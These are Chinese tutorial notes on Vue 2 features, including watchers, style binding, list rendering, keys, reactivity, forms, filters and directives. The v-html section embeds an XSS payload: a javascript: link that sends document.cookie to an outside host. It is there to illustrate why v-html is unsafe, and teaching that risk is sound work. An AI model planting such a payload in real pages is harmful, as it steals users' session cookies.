---
title: 0w2 vue 介绍
---

## 2、开始学习vue

Vue3 代码片段插件

[https://marketplace.visualstudio.com/items?itemName=hollowtree.vue-snippets](https://marketplace.visualstudio.com/items?itemName=hollowtree.vue-snippets)

### 1、监视属性

> 引入案列：天气变化

```html
<body>
<div id="root">
    <h2>hello {{name}}</h2>
    <h2>天气：{{isHot ? '炎热' : '凉爽'}}</h2>
    <h2>天气：{{info}}</h2>
    <button @click="isHot = !isHot">1</button>
    <button @click="changeW">2</button>
</div>


<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: 'clxmm',
            isHot: true
        },
        computed: {
            info() {
                return this.isHot ? '炎热' : '凉爽';
            }
        },
        methods: {
            changeW() {
                this.isHot = !this.isHot
            }
        }
    })
</script>

</body>
```

> **监视属性**

1.当被监视的属性变化时, 回调函数自动调用, 进行相关操作

2.监视的属性必须存在，才能进行监视！！

3.监视的两种写法：

​	(1).new Vue时传入watch配置

​	(2).通过vm.$watch监视

```html
<div id="root">
    <h2>hello {{name}}</h2>
    <h2>天气：{{isHot ? '炎热' : '凉爽'}}</h2>
    <h2>天气：{{info}}</h2>
    <button @click="isHot = !isHot">1</button>
    <button @click="changeW">2</button>
</div>

<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: 'clxmm',
            isHot: true
        },
        computed: {
            info() {
                return this.isHot ? '炎热' : '凉爽';
            }
        },
        watch: {
            isHot:{
                immediate:true, //初始化时让handler调用一下
                handler(newValue,oldValue) {
                    console.log("isHot 修改了",newValue,oldValue)
                }
            }
        },
        methods: {
            changeW() {
                this.isHot = !this.isHot
            }
        }
    })

/*    vm.$watch('isHot',{
        immediate:true, //初始化时让handler调用一下
        //handler什么时候调用？当isHot发生改变时。
        handler(newValue,oldValue){
            console.log('isHot被修改了',newValue,oldValue)
        }
    })*/
</script>

</body>
```



> 深度监视

**深度监视：**

(1).Vue中的watch默认不监测对象内部值的改变（一层）。

(2).配置deep:true可以监测对象内部值改变（多层）。

**备注：**

(1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！

(2).使用watch时根据数据的具体结构，决定是否采用深度监视。

```html
<body>
<div id="root">
    <h2>hello {{name}}</h2>
    <h2>天气：{{isHot ? '炎热' : '凉爽'}}</h2>
    <h2>天气：{{info}}</h2>
    <button @click="isHot = !isHot">1</button>
    <button @click="changeW">2</button>

    <br>
    <h2>a: {{numbers.a}}</h2>
    <button @click="numbers.a++">++</button>
</div>


<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: 'clxmm',
            isHot: true,
            numbers: {
                a:1,
                b:2
            }
        },
        computed: {
            info() {
                return this.isHot ? '炎热' : '凉爽';
            }
        },
        watch: {
            'numbers.a':{
                handler(newValue, oldValue) {
                    console.log("a",newValue,oldValue)
                }
            },
            numbers: {
                deep:true,
                handler() {
                    console.log('numbers改变了')
                }
            },
            isHot:{
                immediate:true, //初始化时让handler调用一下
                handler(newValue,oldValue) {
                    console.log("isHot 修改了",newValue,oldValue)
                }
            }
        },
        methods: {
            changeW() {
                this.isHot = !this.isHot
            }
        }
    })

</script>

</body>
```

> 监视属性简写

和计算属性类似，当我们在监视属性中只配置handler时，可以简写

```html
<body>
<div id="root">
    <h2>hello {{name}}</h2>
    <h2>天气：{{isHot ? '炎热' : '凉爽'}}</h2>
    <button @click="isHot = !isHot">1</button>

</div>


<script type="text/javascript">
    const  vm =new Vue({
        el: '#root',
        data: {
            name: 'clxmm',
            isHot: true,
            numbers: {
                a:1,
                b:2
            }
        },
        computed: {
            info() {
                return this.isHot ? '炎热' : '凉爽';
            }
        },
        watch: {
            // 正常写法
/*            isHot:{
                deep:true,
                immediate:true, //初始化时让handler调用一下
                handler(newValue,oldValue) {
                    console.log("isHot 修改了",newValue,oldValue)
                }
            }*/
            // 简写
       /*      isHot(newValue,oldValue){
                console.log('isHot被修改了',newValue,oldValue,this)
            }*/

        },
        methods: {
            changeW() {
                this.isHot = !this.isHot
            }
        }
    })


    //正常写法
    /* vm.$watch('isHot',{
        immediate:true, //初始化时让handler调用一下
        deep:true,//深度监视
        handler(newValue,oldValue){
            console.log('isHot被修改了',newValue,oldValue)
        }
    }) */

    //简写
     vm.$watch('isHot',function(newValue,oldValue){
        console.log('isHot被修改了',newValue,oldValue,this)
    })
    /* vm.$watch('isHot',(newValue,oldValue)=>{
        console.log('isHot被修改了',newValue,oldValue,this)
    }) */

</script>

</body>
```



> computed和watch之间的区别：

1.computed能完成的功能，watch都可以完成。

2.watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。

**两个重要的小原则：**

1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。

2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象。

### 2、绑定样式

**1. class样式**

- 写法:class="xxx" xxx可以是字符串、对象、数组。
  - 字符串写法适用于：类名不确定，要动态获取。
  - 对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
  - 数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。

**2. style样式**

- :style="{fontSize: xxx}"其中xxx是动态值。
- :style="[a,b]"其中a、b是样式对象。

```html
<style>
    .basic {
        width: 400px;
        height: 100px;
        border: 1px solid black;
    }

    .happy {
        border: 4px solid red;;
        background-color: rgba(255, 255, 0, 0.644);
        background: linear-gradient(30deg, yellow, pink, orange, yellow);
    }

    .sad {
        border: 4px dashed rgb(2, 197, 2);
        background-color: gray;
    }

    .normal {
        background-color: skyblue;
    }

    .atguigu1 {
        background-color: yellowgreen;
    }

    .atguigu2 {
        font-size: 30px;
        text-shadow: 2px 2px 10px red;
    }

    .atguigu3 {
        border-radius: 20px;
    }
</style>

<div id="root" class="basic">
    <h2>hello {{name}}</h2>
    <button class="basic" :class="mood" id="demo1" @click="changeMood">change</button>

    <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
    <div class="basic" :class="classArr">{{name}}</div>
    <br/><br/>

    <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
    <div class="basic" :class="classObj">{{name}}</div>
    <br/><br/>

    <!-- 绑定style样式--对象写法 -->
    <div class="basic" :style="styleObj">{{name}}</div>
    <br/><br/>

    <!-- 绑定style样式--数组写法 -->
    <div class="basic" :style="styleArr">{{name}}</div>


</div>


<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: 'clxmm',
            mood: 'normal',
            classArr: ['atguigu1', 'atguigu2', 'atguigu3'],
            classObj: {
                atguigu1: false,
                atguigu2: false,
            },
            styleObj: {
                fontSize: '40px',
                color: 'red',
            },
            styleArr: [
                {
                    fontSize: '40px',
                    color: 'blue',
                },
                {
                    backgroundColor: 'gray'
                }
            ]
        },
        methods: {
            changeMood() {
                const arr = ['happy', 'sad', 'normal']
                const index = Math.floor(Math.random() * 3)
                this.mood = arr[index]
            }
        }
    })
</script>

</body>
```

### 3、条件渲染

> 条件渲染：

- 1.v-if
  - (1).v-if="表达式"
  - (2).v-else-if="表达式"
  - (3).v-else="表达式"
  - 适用于：切换频率较低的场景。
  - 特点：不展示的DOM元素直接被移除。
  - 注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。
- 2.v-show
  - 写法：v-show="表达式"
  - 适用于：切换频率较高的场景。
  - 特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
- 3.备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。
  - template 只能与v-if一起使用

```html
<div id="root">
    <h2>hello {{name}}</h2>
    <button @click="n++">点我n+1</button>

    <!-- 使用v-show做条件渲染 -->
    <!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
    <!-- <h2 v-show="1 === 1">欢迎来到{{name}}</h2> -->


    <!-- 使用v-if做条件渲染 -->
    <!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->
    <!-- <h2 v-if="1 === 1">欢迎来到{{name}}</h2> -->

    <!-- v-else和v-else-if -->
    <!-- <div v-if="n === 1">Angular</div>
    <div v-else-if="n === 2">React</div>
    <div v-else-if="n === 3">Vue</div>
    <div v-else>哈哈</div> -->


    <!-- v-if与template的配合使用 -->
    <template v-if="n === 1">
        <h2>你好</h2>
        <h2>123</h2> 
        <h2>北京</h2>
    </template>
</div>


<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: 'clxmm',
            a: false,
            n: 0
        },
        methods: {}
    })
</script>

</body>
```

### 4、列表渲染

> v-for指令:

- 1.用于展示列表数据
- 2.语法：v-for="(item, index) in xxx" :key="yyy"
- 3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）

```html
<body>
<div id="root">
    <h2>hello {{name}}</h2>

    <ul>
        <!--        <li v-for="p in persons" :key="p.id">-->
        <li v-for="(p,index) in persons" :key="index">
            name: {{p.name}} ; age: {{p.age}}
        </li>
    </ul>

    <!-- 遍历对象 -->
    <h2>汽车信息（遍历对象）</h2>
    <ul>
        <li v-for="(value,k) of car" :key="k">
            {{k}}-{{value}}
        </li>
    </ul>

    <!-- 遍历字符串 -->
    <h2>测试遍历字符串（用得少）</h2>
    <ul>
        <li v-for="(char,index) of str" :key="index">
            {{char}}-{{index}}
        </li>
    </ul>

    <!-- 遍历指定次数 -->
    <h2>测试遍历指定次数（用得少）</h2>
    <ul>
        <li v-for="(number,index) of 5" :key="index">
            {{index}}-{{number}}
        </li>
    </ul>
</div>


<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: 'clxmm',
            persons: [
                {id: 1, name: 'clxmm', age: 18},
                {id: 2, name: 'clxmm2', age: 18},
                {id: 3, name: 'clxmm3', age: 18}
            ],
            car:{
                name:'奥迪A8',
                price:'70万',
                color:'黑色'
            },
            str:'hello'
        },
        methods: {}
    })
</script>

</body>
```

> key的原理

<img src="https://cdn.jsdelivr.net/gh/clxmm/image@main/img/202108/vue20210809211451.png" style="zoom:50%;" />

<img src="https://cdn.jsdelivr.net/gh/clxmm/image@main/img/202108/vue20210809211320.png" style="zoom:50%;" />

> **react、vue中的key有什么作用？（key的内部原理）**

- 1. 虚拟DOM中key的作用：

  - key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 
  - 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：

- 2.对比规则：

  - 1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
    - ①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
    - ②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
  - (2).旧虚拟DOM中未找到与新虚拟DOM相同的key
    - 创建新的真实DOM，随后渲染到到页面。

- 3. 用index作为key可能会引发的问题：

  - 1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:

    - 会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。

  - 2. 如果结构中还包含输入类的DOM：

    - 会产生错误DOM更新 ==> 界面有问题。

- 4. 开发中如何选择key?:

  - 1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
  - 2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。

```html
<body>
<div id="root">
    <h2>hello {{name}}</h2>

    <ul>
        <!--        <li v-for="p in persons" :key="p.id">-->
        <button @click.once="add">添加一个老刘</button>
        <li v-for="(p,index) in persons" :key="p.id">
            name: {{p.name}} ; age: {{p.age}}
            <input type="text">
        </li>
    </ul>

</div>


<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: 'clxmm',
            persons: [
                {id: 1, name: 'clxmm', age: 18},
                {id: 2, name: 'clxmm2', age: 18},
                {id: 3, name: 'clxmm3', age: 18}
            ]
        },
        methods: {
            add() {
                const p = {id: '004', name: '老刘', age: 40}
                this.persons.unshift(p)
            }
        }
    })
</script>
</body>
```

> 列表过滤

```html
<body>
<div id="root">
    <h2>人员列表</h2>
    <input type="text" placeholder="请输入名字" v-model="keyWord">
    <ul>
        <li v-for="(p,index) of filPerons" :key="index">
            {{p.name}}-{{p.age}}-{{p.sex}}
        </li>
    </ul>
</div>


<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: 'clxmm',
            keyWord:'',
            persons:[
                {id:'001',name:'马冬梅',age:19,sex:'女'},
                {id:'002',name:'周冬雨',age:20,sex:'女'},
                {id:'003',name:'周杰伦',age:21,sex:'男'},
                {id:'004',name:'温兆伦',age:22,sex:'男'}
            ],
            // filPerons:[]
        },
        methods: {

        },
        watch: {
       /*   /!*  keyWord(val) {
                this.filPerons = this.persons.filter((p) => {
                    return p.name.indexOf(val) !== -1;
                })
            }*!/
            keyWord:{
                immediate:true,
                handler(val) {
                    this.filPerons = this.persons.filter((p) => {
                        return p.name.indexOf(val) !== -1;
                    })
                }
            }*/
        },
        computed: {
            filPerons(){
                return this.persons.filter((p)=>{
                    return p.name.indexOf(this.keyWord) !== -1
                })
            }
        }

    })
</script>

</body>
```

> 列表排序

```html
<body>
<div id="root">
    <h2>人员列表</h2>
    <input type="text" placeholder="请输入名字" v-model="keyWord">
    <button @click="sortType = 2">年龄升序</button>
    <button @click="sortType = 1">年龄降序</button>
    <button @click="sortType = 0">原顺序</button>
    <ul>
        <li v-for="(p,index) of filPerons" :key="index">
            {{p.name}}-{{p.age}}-{{p.sex}}
        </li>
    </ul>
</div>


<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: 'clxmm',
            keyWord: '',
            sortType: 0, //0原顺序 1降序 2升序
            persons: [
                {id: '001', name: '马冬梅', age: 19, sex: '女'},
                {id: '002', name: '周冬雨', age: 20, sex: '女'},
                {id: '003', name: '周杰伦', age: 21, sex: '男'},
                {id: '004', name: '温兆伦', age: 22, sex: '男'}
            ],
            // filPerons:[]
        },
        methods: {},
        computed: {
            filPerons() {
                const array = this.persons.filter((p) => {
                    return p.name.indexOf(this.keyWord) !== -1
                })

                //判断一下是否需要排序
                if (this.sortType) {
                    array.sort((p1, p2) => {
                        return this.sortType === 1 ? p2.age - p1.age : p1.age - p2.age
                    })
                }

                return array
            }
        }

    })
</script>

</body>
```

> 更新时的一个问题

```html
<body>
<div id="root">
    <h2>人员列表</h2>
    <button @click="updateMei">更新马冬梅的信息</button>
    <ul>
        <li v-for="(p,index) of persons" :key="p.id">
            {{p.name}}-{{p.age}}-{{p.sex}}
        </li>
    </ul>
</div>


<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: 'clxmm',
            keyWord: '',
            sortType: 0, //0原顺序 1降序 2升序
            persons: [
                {id: '001', name: '马冬梅', age: 19, sex: '女'},
                {id: '002', name: '周冬雨', age: 20, sex: '女'},
                {id: '003', name: '周杰伦', age: 21, sex: '男'},
                {id: '004', name: '温兆伦', age: 22, sex: '男'}
            ],
            // filPerons:[]
        },
        methods: {
            updateMei() {
                // this.persons[0].name = '马老师' //奏效
                // this.persons[0].age = 50 //奏效
                // this.persons[0].sex = '男' //奏效
                // this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
                this.persons.splice(0, 1, {id: '001', name: '马老师', age: 50, sex: '男'})
            }
        }

    })
</script>

</body>
```

**this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效**

> vue监测数据的原理

[https://cn.vuejs.org/v2/guide/list.html#%E6%95%B0%E7%BB%84%E6%9B%B4%E6%96%B0%E6%A3%80%E6%B5%8B](https://cn.vuejs.org/v2/guide/list.html#%E6%95%B0%E7%BB%84%E6%9B%B4%E6%96%B0%E6%A3%80%E6%B5%8B)



> vue set的使用
>
> Vue数据监测-数组

**Vue监视数据的原理：**

- 1. vue会监视data中所有层次的数据。
- \2. 如何监测对象中的数据？
  - 通过setter实现监视，且要在new Vue时就传入要监测的数据。
    - (1).对象中后追加的属性，Vue默认不做响应式处理
    - (2).如需给后添加的属性做响应式，请使用如下API：
      - ue.set(target，propertyName/index，value) 或 vm.$set(target，propertyName/index，value)
- \3. 如何监测数组中的数据？
  - 通过包裹数组更新元素的方法实现，本质就是做了两件事：
    - (1).调用原生对应的方法对数组进行更新。
    - (2).重新解析模板，进而更新页面。
- 4.在Vue修改数组中的某个元素一定要用如下方法：
  - 1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
  - 2.Vue.set() 或 vm.$set()
- 特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！

```html
<div id="root">
    <h2>hello {{name}}</h2>


    <button @click="student.age++">年龄+1岁</button>
    <br/>
    <button @click="addSex">添加性别属性，默认值：男</button>
    <br/>
    <button @click="student.sex = '未知' ">修改性别</button>
    <br/>

    <button @click="addFriend">在列表首位添加一个朋友</button>

    <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button>


    <button @click="addHobby">添加一个爱好</button>
    <br/>

    <button @click="updateHobby">修改第一个爱好为：开车</button>
    <br/>

    <button @click="removeSmoke">过滤掉爱好中的抽烟</button>
    <br/>


    <br/>


    <h3>姓名：{{student.name}}</h3>
    <h3>年龄：{{student.age}}</h3>
    <h3 v-if="student.sex">性别：{{student.sex}}</h3>
    <h3>爱好：</h3>
    <ul>
        <li v-for="(h,index) in student.hobby" :key="index">
            {{h}}
        </li>
    </ul>
    <h3>朋友们：</h3>
    <ul>
        <li v-for="(f,index) in student.friends" :key="index">
            {{f.name}}--{{f.age}}
        </li>
    </ul>
</div>


<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: 'clxmm',
            student: {
                name: 'tom',
                age: 18,
                hobby: ['抽烟', '喝酒', '烫头'],
                friends: [
                    {name: 'jerry', age: 35},
                    {name: 'tony', age: 36}
                ]
            }
        },
        methods: {
            addSex() {
                // Vue.set(this.student,'sex','男')
                this.$set(this.student, 'sex', '男')
            },
            addFriend() {
                this.student.friends.unshift({name: 'jack', age: 70})
            },
            updateFirstFriendName() {
                this.student.friends[0].name = '张三'
            },
            addHobby() {
                this.student.hobby.push('学习')
            },
            updateHobby() {
                // this.student.hobby.splice(0,1,'开车')
                // Vue.set(this.student.hobby,0,'开车')
                this.$set(this.student.hobby, 0, '开车')
            },
            removeSmoke() {
                this.student.hobby = this.student.hobby.filter((h) => {
                    return h !== '抽烟'
                })
            }
        }
    })
</script>

</body>
```



### 5、收集表单数据

**收集表单数据：**

- 若：\<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
- 若：\<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
- 若：\<input type="checkbox"/>
  - 1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
  - 2.配置input的value属性:   
    - (1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
    - (2)v-model的初始值是数组，那么收集的的就是value组成的数组
- 备注：v-model的三个修饰符：
  - lazy：失去焦点再收集数据
  - number：输入字符串转为有效的数字
  - trim：输入首尾空格过滤

```html
<body>
<div id="root">
    <h2>hello {{name}}</h2>
    <form @submit.prevent="demo">
        账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
        密码：<input type="password" v-model="userInfo.password"> <br/><br/>
        年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
        性别：
        男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
        女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
        爱好：
        学习<input type="checkbox" v-model="userInfo.hobby" value="study">
        打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
        吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
        <br/><br/>
        所属校区
        <select v-model="userInfo.city">
            <option value="">请选择校区</option>
            <option value="beijing">北京</option>
            <option value="shanghai">上海</option>
            <option value="shenzhen">深圳</option>
            <option value="wuhan">武汉</option>
        </select>
        <br/><br/>
        其他信息：
        <textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
        <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.baidu.com">《用户协议》</a>
        <button >提交</button>

    </form>

</div>


<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: 'clxmm',
            userInfo: {
                account: '',
                password: '',
                age: 18,
                sex: 'female',
                hobby: [],
                city: 'beijing',
                other: '',
                agree: ''
            }
        },
        methods: {
            demo() {
                console.log(JSON.stringify(this.userInfo))
            }
        }
    })
</script>
</body>
```

### 6、过滤器

cnd [https://www.bootcdn.cn/](https://www.bootcdn.cn/)

**过滤器：**

- 定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
- 语法：
  - 1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
  - 2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
- 备注：
  - 1.过滤器也可以接收额外参数、多个过滤器也可以串联
  - 2.并没有改变原本的数据, 是产生新的对应的数据

```html
<div id="root">
    <h2>hello {{name}}</h2>
    <h2>显示格式化后的时间</h2>
    <!-- 计算属性实现 -->
    <h3>现在是：{{fmtTime}}</h3>

    <!-- methods实现 -->
    <h3>现在是：{{getFmtTime()}}</h3>

    <!-- 过滤器实现 -->
    <h3>现在是：{{time | timeFormater}}</h3>

    <!-- 过滤器实现（传参） -->
    <h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>

    <h3 :x="name | mySlice">hello</h3>
</div>


<script type="text/javascript">

    //全局过滤器
    Vue.filter('mySlice', function (value) {
        return value.slice(0, 4)
    })

    new Vue({
        el: '#root',
        data: {
            name: 'clxmm111',
            time:1621561377603, //时间戳
        },
        methods: {
            getFmtTime() {
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
            }
        },
        computed: {
            fmtTime() {
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
            }
        },
        filters: {
            timeFormater(value, str = 'YYYY年MM月DD日 HH:mm:ss') {
                // console.log('@',value)
                console.log(this.time)
                return dayjs(value).format(str)
            }
        }
    })
</script>

</body>
```

### 7、内置指令

- v-text指令：
  - 1.作用：向其所在的节点中渲染文本内容。
  - 2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
- v-html指令：
  - 1.作用：向指定节点中渲染包含html结构的内容。
  - 2.与插值语法的区别：
    - (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
    - (2).v-html可以识别html结构。
  - 3.严重注意：v-html有安全性问题！！！！
    - (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
    - (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
- v-cloak指令（没有值）：]
  - 1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
  - 2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
- v-once指令：
  - 1.v-once所在节点在初次动态渲染后，就视为静态内容了。
  - 2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
- v-pre指令：
  - 1.跳过其所在节点的编译过程。
  - 2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

```html
<div id="root">
    <h2>hello {{name}}</h2>


    <!--    v-text-->
    <div v-text="name"></div>

    <div v-text="str"></div>
    <!--    v-html -->
    <div v-html="str"></div>


    <div v-html="str2"></div>

</div>


<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: 'clxmm',
            str: '<h3>你好啊！</h3>',
            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
        },
        methods: {}
    })
</script>

</body>
```



v-cloak

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-cloak指令</title>
		<style>
			[v-cloak]{
				display:none;
			}
		</style>
		<!-- 引入Vue -->
	</head>
	<body>
		<!-- 
				v-cloak指令（没有值）：
						1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
						2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-cloak>{{name}}</h2>
		</div>
		<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
	</body>
	
	<script type="text/javascript">
		console.log(1)
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```

v-once

```html
<body>
<div id="root">
    <h2>hello {{name}}</h2>
    <h2 v-once>n: {{n}}</h2>
    <h2>n1: {{n}}</h2>

    <button @click="n++"> 点击</button>


</div>


<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: 'clxmm',
            n: 1
        },
        methods: {

        }
    })
</script>

</body>
```

v-pre

```html
<body>
<div id="root">
    <h2>hello {{name}}</h2>
    <h2 v-pre>hello </h2>
    <h2 v-pre>n: {{n}}</h2>
    <h2>n1: {{n}}</h2>
    <button @click="n++"> 点击</button>
</div>


<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: 'clxmm'
        },
        methods: {

        }
    })
</script>

</body>
```



### 8、自定义指令

**自定义指令**

- 一、定义语法：

  - (1).局部指令：

  ```
  												new Vue({															new Vue({
  													directives:{指令名:配置对象}   或   		directives{指令名:回调函数}
  												}) 																		})
  ```

  - (2).全局指令：
    - Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)

- 二、配置对象中常用的3个回调：

  - (1).bind：指令与元素成功绑定时调用。
  - (2).inserted：指令所在元素被插入页面时调用。
  - (3).update：指令所在模板结构被重新解析时调用。

- 三、备注：

  - 1.指令定义时不加v-，但使用时要加v-；
  - 2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。

```html
<body>
<div id="root">
    <h2>hello {{name}}</h2>
    <h2>h : <span v-text="n"></span></h2>

    <h2>big : <span v-big="n"></span></h2>

    <button @click="n++">++</button>

    <hr>
    <h2>fbind : <input v-fbind:value="n"/></h2>


</div>


<script type="text/javascript">
    /*
        需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
                    需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。

                    */

    //定义全局指令
    /* Vue.directive('fbind',{
        //指令与元素成功绑定时（一上来） 
        bind(element,binding){
            element.value = binding.value
        },
        //指令所在元素被插入页面时
        inserted(element,binding){
            element.focus()
        },
        //指令所在的模板被重新解析时
        update(element,binding){
            element.value = binding.value
        }
    }) */

    new Vue({
        el: '#root',
        data: {
            name: 'clxmm',
            n: 1
        },
        methods: {},
        directives: {
            /* 'big-number'(element,binding){
					// console.log('big')
					element.innerText = binding.value * 10
				}, */
            //big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
            big(element, binding) {
                console.log('big', this) //注意此处的this是window
                console.log(element instanceof HTMLElement)  // true
                console.log(binding.value)
                element.innerText = binding.value * 10
            },
            // fbind(element,binding) {
            //     element.value = binding.value
            //
            //     element.focus()
            //
            // },

            fbind: {
                //指令与元素成功绑定时（一上来）
                bind(element, binding) {
                    element.value = binding.value
                },
                //指令所在元素被插入页面时
                inserted(element, binding) {
                    element.focus()
                },
                //指令所在的模板被重新解析时
                update(element, binding) {
                    element.value = binding.value
                }
            }

        }
    })
</script>

</body>
```

